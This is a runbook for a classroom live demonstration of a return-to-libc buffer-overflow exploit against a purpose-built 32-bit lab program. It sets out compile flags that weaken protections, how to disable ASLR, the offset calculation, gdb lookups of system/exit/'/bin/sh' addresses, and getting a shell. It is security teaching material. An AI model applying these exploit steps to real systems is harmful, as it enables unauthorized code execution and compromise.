# Return-to-libc Live Demo — Runbook

Everything here runs in your WSL Ubuntu terminal (the one you already set up with
gdb/GEF for the labs). Do the **"Before the talk"** section once, ahead of time, so
you're not compiling or hunting for addresses live. During the talk you only run the
**"Live, in front of the class"** commands.

Your exact addresses will differ from the examples below — that's expected, that's the
point (ASLR, different machine, different libc build). Step 2 shows you how to get
_your_ real numbers.

---

## Before the talk (do this once, well ahead of time)

### 1. Copy `vuln.c` into your lab folder and compile it

```bash
gcc -m32 -g -fno-stack-protector -no-pie -o vuln.out vuln.c
```

What each flag buys you for the demo:

- `-fno-stack-protector` — no canary, so the overflow isn't caught before you reach the return address (same as your earlier labs)
- `-no-pie` — the program's own code sits at a fixed, predictable address (not needed for ret2libc itself, just keeps the demo simple)
- **Deliberately NOT included: `-z execstack` or anything that makes the stack executable.** NX/DEP stays ON. That's the whole point — this exploit works _despite_ the stack being non-executable, because it never runs code off the stack.

### 2. Disable ASLR for the demo machine (so addresses don't jump around live)

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

Re-enable after your talk with `sudo sysctl -w kernel.randomize_va_space=2` if you want ASLR back for your other lab work.

> If you don't have sudo on the demo machine, prefix every run with
> `setarch $(uname -m) -R` instead — same effect, no system-wide change.

### 3. Find the offset from `buffer` to the return address

```bash
objdump -d vuln.out | grep -A 20 "<vuln>:"
```

Look for the `lea` that loads `buffer`'s address, e.g. `lea -0x48(%ebp),%edx` →
buffer is at `ebp-0x48`. Offset to the return address = that number + 4 (for the
saved `ebp` in between):

```
offset = 0x48 + 4 = 76 bytes
```

(This matches the `flow.c`/`pattern.c` math from your earlier labs — same technique.)

### 4. Find `system()`, `exit()`, and `"/bin/sh"` in your libc, live, with gdb

This is the part worth showing on screen — it's the "finding the gadgets" step:

```bash
gdb -q ./vuln.out
```

```
gef➤  break *(vuln+0x25)       # breakpoint right after strcpy, before vuln returns
gef➤  run AAAA
gef➤  print system
gef➤  print exit
gef➤  find &system,+99999999,"/bin/sh"
```

Note the three addresses printed. Example from testing this demo:

```
system  = 0xf7dcc8e0
exit    = 0xf7dbb5b0
"/bin/sh" = 0xf7f39de8
```

**Yours will be different** — write them down, you'll use them in step 5.

### 5. Build and test the payload once, privately, before class

```bash
python3 build_payload.py <system_addr> <exit_addr> <binsh_addr>
```

(`build_payload.py` is in this folder — it prints the exact command to run.) Run the
command it gives you and confirm you get a shell (`id` should print `uid=0(root)...`
or your user, proving `system("/bin/sh")` ran). Exit the shell with `exit`.

**Do this test run before class.** Live demos are much smoother when you already know
your addresses are correct.

---

## Live, in front of the class (~7 minutes)

Talk through each step as you type it — the class should see _you_ finding the
pieces, not just a working exploit appearing.

**1. Show the source (30 sec)**

```bash
cat vuln.c
```

Point out: `strcpy(buffer, input)` into a 64-byte stack buffer, no bounds check —
same bug class as your earlier labs.

**2. Show NX is on, and that naive shellcode injection is dead (1 min)**

```bash
checksec --file=vuln.out      # or: readelf -l vuln.out | grep -A1 GNU_STACK
```

`NX enabled` / stack segment marked `RW` not `RWE` → the stack is not executable.
If you tried the old "jump to shellcode on the stack" trick here, it'd segfault.

**3. Find the gadgets live (2–3 min)** — repeat step 4 from "Before the talk" on
screen, slower, narrating what each address is and why you need it:

- `system()`'s address — the code you want to run
- `exit()`'s address — a clean fake "return address" for _after_ `system()` returns, so the program exits instead of crashing into garbage
- the address of the string `"/bin/sh"` — `system()`'s argument

**4. Build and fire the payload (1–2 min)**

```bash
python3 build_payload.py <system_addr> <exit_addr> <binsh_addr>
```

Run the printed command. You should drop into a shell.

**5. Prove it (1 min)**

```bash
id
pwd
uname -m
exit
```

`id` proves this is a real, working shell — not injected shellcode, just the
_existing_ `system()` function in libc, redirected to by overwriting the return
address. Nothing new was ever executed; NX never had anything to object to.

---

## If something goes wrong live

- **Segfault instead of a shell:** your offset or one of the three addresses is
  wrong for _this_ machine/session. Don't panic — rerun the gdb steps from step 4
  to re-confirm the addresses (they can differ from your pre-talk test if ASLR got
  re-enabled, e.g. after a reboot).
- **"Command not found: checksec":** skip it, just use
  `readelf -l vuln.out | grep -A1 GNU_STACK` instead (shown above).
- **Have the pre-recorded terminal session as backup** if you can — a short
  `asciinema` or screen recording of a successful run, in case live demo time runs out
  or the classroom projector setup eats a few minutes.
